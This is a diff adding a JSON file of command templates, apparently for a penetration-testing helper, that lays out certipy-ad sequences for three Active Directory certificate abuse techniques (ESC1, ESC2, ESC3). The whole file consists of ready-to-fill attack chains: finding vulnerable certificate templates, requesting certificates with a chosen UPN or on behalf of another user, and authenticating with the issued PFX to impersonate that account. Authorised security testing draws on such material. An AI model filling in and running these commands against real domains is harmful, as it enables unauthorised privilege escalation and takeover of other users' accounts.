@@ -1,0 +1,19 @@
+{
+  "commands": [
+    {
+      "title": "ESC 1",
+      "description": "Enrollee-Supplied Subject for Client Authentication",
+      "template": "certipy-ad find -u {username} -p {password} -dc-ip {dc_ip}\n\ncertipy-ad req -u '{username}@{domain}' -p '{password}' -dc-ip {dc_ip} -target {domain} -ca {ca_name} -template {template_name} -upn {upn}\n\ncertipy-ad auth -pfx {pfx_file} -dc-ip {dc_ip}"
+    },
+    {
+      "title": "ESC 2",
+      "description": "Any Purpose Certificate Template",
+      "template": "certipy-ad find -u {username} -p {password} -dc-ip {dc_ip} -vulnerable -enabled\n\ncertipy-ad req -u '{username}' -p '{password}' -dc-ip '{dc_ip}' -target '{domain}' -ca '{ca_name}' -template 'Vulnerable-ESC2' -debug\n\ncertipy-ad req -u '{username}' -p '{password}' -dc-ip '{dc_ip}' -target '{domain}' -ca '{ca_name}' -template 'User' -on-behalf-of '{on_behalf_user}' -pfx {pfx_file} -debug\n\ncertipy-ad auth -pfx {pfx_file} -dc-ip {dc_ip}"
+    },
+    {
+      "title": "ESC 3",
+      "description": "Enrollment Agent Certificate Template",
+      "template": "certipy-ad find -u {username} -p {password} -dc-ip {dc_ip} -vulnerable -enabled\n\ncertipy-ad req -ca {ca_name} -dc-ip {dc_ip} -u {username} -p '{password}' -template Vulnerable-ESC3 -target {domain}\n\ncertipy-ad req -ca {ca_name} -dc-ip {dc_ip} -u {username} -p '{password}' -template USER -target {domain} -on-behalf-of '{on_behalf_user}' -pfx {pfx_file}\n\ncertipy-ad auth -pfx {pfx_file}"
+    }
+]
+}
